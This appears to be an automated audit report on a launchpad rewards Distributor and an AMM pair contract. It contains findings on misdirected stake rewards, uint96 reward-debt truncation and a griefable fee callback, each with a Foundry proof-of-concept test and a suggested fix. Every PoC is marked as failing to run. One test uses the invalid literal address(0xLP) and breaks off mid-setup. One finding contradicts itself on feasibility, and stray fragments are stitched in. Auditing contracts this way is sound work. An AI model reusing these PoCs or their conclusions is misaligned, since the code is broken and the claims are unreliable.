    function testStakeRewardsPaidToLaunchpadNotUser() public {
        // Add 10 units of base rewards with 1 share outstanding
        vm.prank(rewardProvider);
        distributor.addRewards(address(base), address(quote), 10, 0);

        uint256 distributorBalBefore = base.balanceOf(address(distributor));
        uint256 launchpadBalBefore = base.balanceOf(address(this));
        uint256 userBalBefore = base.balanceOf(alice);

        // Launchpad increases alice's stake; this realizes her pending rewards
        (uint256 baseAmt, ) = distributor.increaseStake(address(base), alice, 1);
        assertGt(baseAmt, 0);

        uint256 distributorBalAfter = base.balanceOf(address(distributor));
        uint256 launchpadBalAfter = base.balanceOf(address(this));
        uint256 userBalAfter = base.balanceOf(alice);

        // Distributor paid out the rewards...
        assertLt(distributorBalAfter, distributorBalBefore);
        // ...but they went to msg.sender (launchpad), not alice
        assertEq(userBalAfter, userBalBefore);
        assertEq(launchpadBalAfter - launchpadBalBefore, baseAmt);

        // From alice's perspective, those rewards are no longer pending
        vm.prank(alice);
        (uint256 pendingBase, ) = distributor.getPendingRewards(address(base), alice);
        assertEq(pendingBase, 0);
    }
}


## Suggested Mitigation
Change the payout logic so that rewards realized for a given account are actually transferred to that account (or to an explicitly specified recipient), not to msg.sender. One straightforward refactor is:

1. Modify _distributeAssets to take a recipient address:

    function _distributeAssets(address to, address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
        if (baseAmount > 0) {
            _decreaseTotalPending(base, baseAmount);
            base.safeTransfer(to, baseAmount);
        }
        if (quoteAmount > 0) {
            _decreaseTotalPending(quote, quoteAmount);
            quote.safeTransfer(to, quoteAmount);
        }
    }

2. In increaseStake/decreaseStake, call _distributeAssets(account, ...) so that stake/unstake rewards are paid to the beneficiary account.
3. In claimRewards, continue to pass msg.sender as the recipient.

This ensures that every decrease in totalPendingRewards[asset] is matched by a transfer to the correct beneficiary as determined by RewardsTrackerLib, preserving accounting invariants and user expectations.


## [H-4]. Rewards realized on stake/unstake go to Launchpad (msg.sender) instead of the staker account

### Finding Severity Justification: On every stake/unstake, matured rewards owed to the user are removed from the Distributor’s pending pool and transferred to msg.sender (the Launchpad) while the user’s reward debts are advanced as if paid. The user cannot later claim these amounts via claimRewards. This is a direct, repeatable loss of user-owed rewards (real asset loss), not just dust, under normal operation.
## Derived From Pattern/Invariant
Staker rewards from stake/unstake are misdirected to caller instead of beneficiary

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Confidence is limited by not reviewing the Launchpad implementation in this report. If Launchpad explicitly forwards the received rewards to users or credits them elsewhere (e.g., AccountManager) in lockstep with the returned amounts, the impact could be mitigated by design. However, given the library semantics and Distributor’s own claimRewards path, directing payments to msg.sender during stake/unstake is inconsistent and likely erroneous.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
Distributor.increaseStake and decreaseStake take an explicit account argument that represents the user whose shares are updated in the rewards pool. The underlying RewardsTrackerLib.stake/unstake routines return baseAmount and quoteAmount equal to the pending rewards owed to that user before the share change, and also advance the user's reward debts as if these rewards were paid.

However, Distributor then passes these amounts to _distributeAssets, which transfers tokens to msg.sender (the Launchpad contract), not to account. As a result:
- The user's rewardDebt is updated as though they received baseAmount/quoteAmount.
- totalPendingRewards[asset] is decremented by those amounts.
- But the actual tokens are credited to the Launchpad contract, not to the user, and the user cannot later reclaim them via claimRewards because their rewardDebt has already been advanced.

Distributor:

```solidity
function increaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.stake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function decreaseStake(address launchAsset, address account, uint96 shares)
    external
    onlyLaunchpad
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.unstake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount); // pays msg.sender, not `account`
    }

    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}
```

RewardsTrackerLib.stake (similar for unstake):

```solidity
function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    if (newShares == 0) revert ZeroShareStake();

    (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare) = self.update();

    UserRewardData storage userData = self.userRewards[user];
    uint256 existingShares = uint96(userData.shares);

    if (existingShares > 0) {
        baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
        quoteAmount = totalAccRewards(existingShares, accQuoteRewardsPerShare) - userData.quoteRewardDebt;
    }

    userData.shares += newShares;
    self.totalShares += newShares;

    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}
```

This is an accounting invariant violation:
- The library assumes amounts it returns are paid to the `user` whose debt it advances.
- Distributor instead pays them to msg.sender (the Launchpad) while still decreasing totalPendingRewards and advancing the user's debts.

Even if launchpad/owner behave honestly and call increaseStake/decreaseStake exactly as intended, users will silently lose the rewards realized on each stake/unstake operation; those rewards accumulate on the Launchpad contract instead.

## Impact
Every time the Launchpad calls increaseStake or decreaseStake for a user with existing shares and non-zero pending rewards, those pending rewards are irrevocably diverted to the Launchpad contract instead of the user. Because the user's rewardDebt is updated as if they were paid, claimRewards() will not later credit them for that period. Over time this can amount to a significant portion of the total launchpad rewards budget being misallocated away from users.

## Command to Run Test


## Proof of Concept
1) Launchpad initializes Distributor and creates a rewards pair for (launchAsset, quoteAsset). 2) Launchpad increases a user's stake once so the user has non-zero shares. 3) Rewards are added to the pool. 4) Launchpad increases the user's stake again. At this point, RewardsTrackerLib.stake returns the user's pending rewards (baseAmount, quoteAmount) and advances the user's reward debt as if paid. Distributor then calls _distributeAssets, which transfers tokens to msg.sender (Launchpad) and decrements totalPendingRewards, but does not pay the user. 5) The user later calls claimRewards, which returns 0 for that period because their reward debt was already advanced, proving the rewards were irreversibly misdirected to the Launchpad.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}

contract MisdirectedRewardsTest is Test {
    Distributor dist;
    MockERC20 token; // acts as launchAsset
    address launchpad;
    address user = address(0x1234);

    function setUp() public {
        launchpad = address(this);
        dist = new Distributor();
        dist.initialize(launchpad);
        token = new MockERC20();
        // quote asset is a dummy address, no transfers will be attempted for quote path in this test
        dist.createRewardsPair(address(token), address(0xBEEF));
    }

    function test_rewardsFromStakeAreMisdirectedToLaunchpad() public {
        uint128 rewardAmount = 1e18;

        // 1) First stake so there are shares in the pool
        dist.increaseStake(address(token), user, 1);

        // 2) Add rewards; Distributor pulls from msg.sender (launchpad)
        token.mint(address(this), rewardAmount);
        dist.addRewards(address(token), address(0xBEEF), rewardAmount, 0);
        assertEq(token.balanceOf(address(this)), 0, "launchpad funded rewards to Distributor");

        // 3) Second stake realizes pending rewards for user, but pays msg.sender (launchpad)
        (uint256 baseAmount, uint256 quoteAmount) = dist.increaseStake(address(token), user, 1);
        assertGt(baseAmount, 0, "some base rewards realized");
        assertEq(quoteAmount, 0, "no quote rewards were added");

        // Assert misdirection: rewards were sent to launchpad, not user
        assertEq(token.balanceOf(address(this)), baseAmount, "launchpad wrongly received user's realized rewards");
        assertEq(token.balanceOf(user), 0, "user did not receive rewards on stake");

        // totalPendingRewards should be decremented by the paid amount
        assertEq(dist.totalPendingRewards(address(token)), rewardAmount - baseAmount, "pending tracker decreased");

        // 4) User can no longer claim those already-realized rewards
        vm.prank(user);
        (uint256 claimBase, uint256 claimQuote) = dist.claimRewards(address(token));
        assertEq(claimBase, 0, "user cannot reclaim already realized rewards");
        assertEq(claimQuote, 0, "no quote rewards");
    }
}


## Suggested Mitigation
Update the distribution routine to pay realized rewards to the intended beneficiary for stake/unstake flows. Add a recipient parameter and use `account` for increaseStake/decreaseStake while keeping claimRewards paying `msg.sender`:

- Change increaseStake/decreaseStake to call `_distributeAssetsTo(account, ...)`.
- Keep claimRewards calling `_distributeAssetsTo(msg.sender, ...)`.

Example:

function increaseStake(address launchAsset, address account, uint96 shares) external onlyLaunchpad returns (uint256 baseAmount, uint256 quoteAmount) {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.stake(account, shares);
    _distributeAssetsTo(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function decreaseStake(address launchAsset, address account, uint96 shares) external onlyLaunchpad returns (uint256 baseAmount, uint256 quoteAmount) {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.unstake(account, shares);
    _distributeAssetsTo(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function claimRewards(address launchAsset) external returns (uint256 baseAmount, uint256 quoteAmount) {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.claim(msg.sender);
    _distributeAssetsTo(msg.sender, launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function _distributeAssetsTo(address recipient, address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) { _decreaseTotalPending(base, baseAmount); base.safeTransfer(recipient, baseAmount); }
    if (quoteAmount > 0) { _decreaseTotalPending(quote, quoteAmount); quote.safeTransfer(recipient, quoteAmount); }
}






 **Derived From** : Invariant Type: Arithmetic - For every reward pool and user, totalAccRewards(user.shares, accBaseRewardPerShare) and totalAccRewards(user.shares, accQuoteRewardPerShare) must always fit into uint96 when assigned to baseRewardDebt and quoteRewardDebt (i.e., totalAccRewards(...) <= type(uint96).max)

## [L-5]. Reward debt stored as uint96 silently truncates for large cumulative rewards, leading to phantom rewards and DoS in stake/unstake/claim

### Finding Severity Justification: The uint96 truncation of reward debt is real and can cause incorrect pending reward calculations and subsequent reverts on claim/stake/unstake. However, triggering this requires a single user’s cumulative rewards in a pool to exceed 2^96-1 units (~7.9e28 wei units; ~7.9e10 tokens with 18 decimals, or ~7.9e19 units for 6 decimals), which is extremely unlikely under practical operations (fees/donations). Impact is functional DoS for the affected user’s reward interactions, not direct fund loss, and only in extreme, impractical conditions.
## Derived From Pattern/Invariant
Invariant Type: Arithmetic - For every reward pool and user, totalAccRewards(user.shares, accBaseRewardPerShare) and totalAccRewards(user.shares, accQuoteRewardPerShare) must always fit into uint96 when assigned to baseRewardDebt and quoteRewardDebt (i.e., totalAccRewards(...) <= type(uint96).max)

## Exploit Type
IntegerMath

## Location
RewardsTrackerLib.stake / unstake / claim (via Distributor.increaseStake, decreaseStake, claimRewards)

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The rewards tracking library stores per‑user reward debts in uint96 (`UserRewardData.baseRewardDebt` and `.quoteRewardDebt`), but computes total accumulated rewards as full uint256 values via `totalAccRewards(shares, accRewardsPerShare)`.

In `stake`, `unstake`, and `claim`, the library performs:

- `uint256 totalAcc = totalAccRewards(...);`
- Then stores `userData.baseRewardDebt = uint96(totalAcc);` and similarly for `quoteRewardDebt`.

There is **no bounds check** before the cast. Once a user has accrued more than `2**96 - 1` units of rewards in a pool (over its lifetime), `totalAccRewards(...)` exceeds `type(uint96).max` and the explicit cast truncates higher bits, effectively setting

`t = totalAccRewards(currentShares, accRewardsPerShare)
userData.baseRewardDebt = uint96(t) == t mod 2**96`

On the next interaction (another `stake`, `unstake`, or `claim`), the library recomputes `totalAccRewards` (still large) and calculates pending as:

```solidity
uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
uint256 baseAmount = totalAccBaseRewards - userData.baseRewardDebt; // claim()
// or
baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt; // stake()/unstake()
```

Because `userData.baseRewardDebt` was truncated modulo `2**96`, `baseAmount` effectively becomes:

`baseAmount ≈ (correct_pending) + k * 2**96`  for some integer `k >= 1`.

So the user appears to have **huge phantom pending rewards** even when no new rewards were added since their last update.

In the real system, these pending amounts are passed to `Distributor._distributeAssets`, which enforces solvency via:

```solidity
function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}
```

After the first large claim, `totalPendingRewards[asset]` has already been fully or mostly reduced. When the truncated debt causes `baseAmount` to be inflated by ~`2**96`, `_decreaseTotalPending` will see `amount > currTotal` and revert with `ClaimAmountExceedsTotalPendingRewards()`.

This has two serious consequences:

1. **Permanent DoS for further reward interactions:**
   - Once a user’s cumulative rewards in a pool cross the `2**96 - 1` threshold and they perform a `claim` (or a partial `stake`/`unstake` that leaves non‑zero shares), their `baseRewardDebt`/`quoteRewardDebt` becomes truncated.
   - Subsequent `claimRewards`, `increaseStake`, or `decreaseStake` calls for that user/pool will compute a bogus, massive `baseAmount`/`quoteAmount` and `_decreaseTotalPending` will revert.
   - The user is then **unable to claim any further rewards for that pool**, and `increaseStake`/`decreaseStake` via `Distributor` will also revert because they auto‑claim pending rewards.

2. **Reward-accounting invariant violation / potential over‑distribution if totalPendingRewards is unusually large:**
   - In exotic cases where `totalPendingRewards[asset]` has also grown above `k * 2**96` (e.g., very large donations or long-running pools with massive rewards), `_decreaseTotalPending` would not revert and the user would actually be paid these phantom rewards, allowing them to drain a disproportionate share of the pool’s incentive tokens.
   - This directly violates the intended invariant that `baseRewardDebt` and `quoteRewardDebt` track the full accumulated rewards, and that `totalPendingRewards` reflects the sum of all unclaimed user entitlements.

Vulnerable snippets (all in `RewardsTrackerLib`):

```solidity
function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint96(userData.shares);
    if (existingShares > 0) {
        baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
        ...
    }
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint256(userData.shares);
    ...
    baseAmount = totalAccRewards(existingShares, accBaseRewardsPerShare) - userData.baseRewardDebt;
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    ...
    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    ...
    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}
```

Because `PRECISION_FACTOR` is `1e12` and `pendingBaseRewards`/`pendingQuoteRewards` are `uint128`, it is entirely feasible for `accBaseRewardPerShare` to become large over the lifetime of a popular pool. A single user with even 1 share can accrue more than `2**96 - 1` units of rewards if total distributed rewards exceed ~`7.9e10` tokens (assuming 18 decimals), at which point this truncation bug is triggered.

These library functions are used indirectly by `Distributor.increaseStake`, `Distributor.decreaseStake`, and `Distributor.claimRewards`, so the resulting bogus `baseAmount`/`quoteAmount` flows into `_distributeAssets` and `_decreaseTotalPending`, causing user-level DoS and/or over-distribution.

## Impact
Once a user’s cumulative rewards for a pool exceed 2**96 - 1, storing the reward debt as uint96 silently truncates. This inflates subsequent pending rewards by ~k * 2**96 (k >= 1). As Distributor enforces solvency via totalPendingRewards, the next claim/increaseStake/decreaseStake for that user reverts with ClaimAmountExceedsTotalPendingRewards, causing a persistent DoS for that user in that pool. In extreme over-funded cases, the user could instead receive phantom over-payments if totalPendingRewards is sufficiently large, violating fair distribution. No direct protocol fund loss occurs under normal conditions, but affected users are bricked from reward interactions.

## Command to Run Test


## Proof of Concept
Reproduction (end-to-end with Distributor):
1) Deploy Distributor and initialize with the test contract as launchpad.
2) Deploy two mock ERC20s (base, quote) and create a rewards pair with base as launch asset.
3) As launchpad, increaseStake for Alice by 1 share so totalShares = 1.
4) Mint to the test contract and approve Distributor to pull base tokens. Call Distributor.addRewards(base, quote, (2**96 + 1), 0). This updates pool.pendingBaseRewards/accBaseRewardPerShare and increases totalPendingRewards[base] while transferring tokens into Distributor.
5) Alice calls claimRewards(base): she correctly receives (2**96 + 1). The library then stores baseRewardDebt = uint96(2**96 + 1) == 1 (truncated).
6) Without adding more rewards, Alice calls claimRewards(base) again. The library computes baseAmount ≈ 2**96 due to the truncated debt. Distributor._decreaseTotalPending sees totalPendingRewards[base] ~ 0 and reverts with ClaimAmountExceedsTotalPendingRewards().
7) From now on, Alice’s claimRewards/increaseStake/decreaseStake in this pool will revert, causing a persistent user-level DoS.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";
import {UserRewardData} from "../contracts/launchpad/libraries/RewardsTracker.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) { require(a >= amount, "allow"); allowance[from][msg.sender] = a - amount; }
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount; balanceOf[to] += amount; return true;
    }
}

contract RewardDebtTruncationDistributorTest is Test {
    Distributor internal dist;
    MockERC20 internal base;
    MockERC20 internal quote;
    address internal alice = address(0xABCD);

    function setUp() public {
        dist = new Distributor();
        dist.initialize(address(this)); // set this test as launchpad
        base = new MockERC20("BASE","B");
        quote = new MockERC20("QUOTE","Q");
        dist.createRewardsPair(address(base), address(quote));
        // Give Alice 1 share so totalShares = 1
        dist.increaseStake(address(base), alice, 1);
    }

    function test_TruncationCausesDoSOnSecondClaim() public {
        uint128 amount = uint128((uint256(1) << 96) + 1);
        // Fund Distributor via addRewards (pulls tokens and bumps totalPending)
        base.mint(address(this), amount);
        base.approve(address(dist), amount);
        dist.addRewards(address(base), address(quote), amount, 0);

        // First claim pays full amount
        vm.prank(alice);
        (uint256 base1, uint256 quote1) = dist.claimRewards(address(base));
        assertEq(base1, uint256(amount));
        assertEq(quote1, 0);

        // Reward debt stored truncated to uint96
        UserRewardData memory u = dist.getUserData(address(base), alice);
        assertLt(u.baseRewardDebt, uint96(base1));

        // Second claim (without new rewards) should revert due to phantom pending ~2**96
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        vm.prank(alice);
        dist.claimRewards(address(base));
    }
}


## Suggested Mitigation
Use a non-truncating type for reward debts or enforce range checks before narrowing casts.
- Preferred: change UserRewardData.baseRewardDebt and quoteRewardDebt to uint256 and assign without casting: userData.baseRewardDebt = totalAccRewards(...). This removes the class of truncation bugs entirely at negligible cost.
- If storage growth is unacceptable: keep uint96 but add explicit bounds checks wherever assigning debts, reverting on overflow (e.g., if (newDebt > type(uint96).max) revert RewardDebtOverflow()). This prevents silent corruption and persistent DoS.
- Optionally document/enforce per-pool cumulative reward caps so that shares * accRewardsPerShare / PRECISION_FACTOR stays within selected debt width.





 **Derived From** : GriefableCallbacks

## [M-6]. GTELaunchpadV2Pair’s external fee callback to Distributor.addRewards can revert when totalShares==0, DoSing swaps/mints/burns/sync

### Finding Severity Justification: Core AMM functions (swap/mint/burn/sync) can be reverted due to an unguarded external call to Distributor.addRewards when rs.totalShares == 0. This creates a denial-of-service that can brick the pair’s availability for all users until a privileged party intervenes. No direct asset theft occurs, so this is availability impact rather than capital loss.
## Derived From Pattern/Invariant
GriefableCallbacks

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair.swap / mint / burn / sync (via _update and _distributeLaunchpadFees)

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Integration timing (when endRewardsAccrual is called by the launchpad) is not fully shown in the provided code/docs and appears somewhat contradictory. However, the on-chain path and revert condition are clear and reproducible; if totalShares == 0 while rewardsPoolActive > 0, the DoS occurs.
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair distributes a portion of swap fees to an external launchpad fee Distributor. This is wired directly into the hot path of _update(), which is called by swap, mint, burn, and sync:

```solidity
function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;

    uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
    uint32 timeElapsed = blockTimestamp - blockTimestampLast;
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```

There is no try/catch or guard in _distributeLaunchpadFees, so any revert in the external addRewards() call will bubble up and revert swap(), mint(), burn(), and sync().

On the Distributor side, addRewards() reverts when there are no staking shares in the rewards pool:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

rs.totalShares is the total staking shares for the launch asset. It can legitimately be zero in at least two important phases:
- **Before any staking has occurred** after a rewards pool is created (createRewardsPair), or
- **After all bonders have fully exited** and totalShares has been driven down to 0 by normal user-/launchpad-driven unstake flows, while the pair’s rewardsPoolActive flag is still 1 and the pair continues to accrue launchpad swap fees.

In either case, if the pair accumulates a non-zero launchpad fee (via _getLaunchpadFees in swap) and then _update() runs with timeElapsed > 0, it will call _distributeLaunchpadFees, which in turn calls distributor.addRewards(). Since rs.totalShares == 0, addRewards() reverts with NoSharesToIncentivize(). That revert bubbles back up through _update(), causing the original swap (or mint/burn/sync) to revert as well.

This creates a classic griefable callback/DoS vulnerability:
- Core AMM functions (swap/mint/burn/sync) are made strictly dependent on the success of an external callback (Distributor.addRewards).
- That callback can revert under realistic, non-privileged conditions when rs.totalShares == 0, which is entirely plausible at pool bootstrap or after bonders have fully exited.
- When this condition holds, the first swap/mint/burn/sync that attempts to distribute accumulated launchpad fees will revert, and all future such calls will also revert until a privileged actor calls Distributor.endRewards() -> pair.endRewardsAccrual() to disable rewards and clear accrued fees.

As a result, a launchpad pair can become untradable (no swaps or liquidity ops succeed) while rewardsPoolActive > 0 and totalShares == 0, even if all contracts are behaving according to spec.

## Impact
Core AMM operations (swap/mint/burn/sync) can revert whenever GTELaunchpadV2Pair attempts to distribute fees and IDistributor.addRewards reverts. This occurs not only when rs.totalShares == 0 (NoSharesToIncentivize), but also if the rewards pool was not created for the token pair (RewardsDoNotExist). In both cases, the external callback revert bubbles up, bricking trading and liquidity ops for all users until a privileged actor intervenes (e.g., ending rewards) or until shares are restored by the launchpad. No funds are stolen, but the pair becomes unavailable (DoS) affecting the entire pool.

## Command to Run Test


## Proof of Concept
The following Foundry test constructs a realistic environment with a GTELaunchpadV2Pair, a Distributor, and two mock ERC20 tokens. It then demonstrates that a normal swap reverts with Distributor.NoSharesToIncentivize() when the rewards pool exists but rs.totalShares == 0.

Scenario:
1. Deploy Distributor and set its launchpad address to the test contract.
2. Call distributor.createRewardsPair(token0, token1) to initialize a rewards pool for token0, with quoteAsset = token1 and totalShares = 0.
3. Deploy GTELaunchpadV2Pair with a dummy factory and initialize it with token0, token1, launchpadLp, and the Distributor as launchpadFeeDistributor.
4. Mint large balances of token0 and token1 into the pair and call pair.mint(launchpadLp) to seed initial liquidity.
5. A trader mints some token0, transfers amountIn to the pair, and then calls pair.swap(0, amount1Out, trader, "").
6. Because launchpadFeeDistributor != 0, rewardsPoolActive == 1, and amount0In > 0, _getLaunchpadFees returns a positive fee0. In _update(), timeElapsed > 0 and reserves are non-zero, so _distributeLaunchpadFees(totalLaunchpadFee0, 0) is called.
7. _distributeLaunchpadFees approves token0 to the Distributor and calls distributor.addRewards(token0, token1, fee0, 0).
8. In addRewards(), rs.totalShares == 0 for the launch asset, so it reverts with NoSharesToIncentivize(). This revert bubbles through _update and causes swap() to revert.

Thus, as long as rs.totalShares == 0 and fees are accrued, the pair is functionally DoSed.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// Minimal factory that satisfies feeTo() calls from the pair
contract DummyFactory {
    address public feeTo;
    address public feeToSetter;

    function setFeeTo(address _feeTo) external { feeTo = _feeTo; }
    function setFeeToSetter(address _feeToSetter) external { feeToSetter = _feeToSetter; }
}

contract LaunchpadPairGriefableCallbackTest is Test {
    GTELaunchpadV2Pair pair;
    Distributor distributor;
    MockERC20 token0;
    MockERC20 token1;
    DummyFactory factory;

    address launchpadLp = address(0xLP);
    address launchpad = address(this);

    function setUp() public {
        // Deploy distributor and set launchpad
        distributor = new Distributor();
        distributor.initialize(launchpad);

        // Deploy tokens
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");

        // Create rewards pool for token0/token1; totalShares == 0
        distributor.createRewardsPair(address(token0), address(token1));

        // Deploy pair with dummy factory as msg.sender
        factory = new DummyFactory();
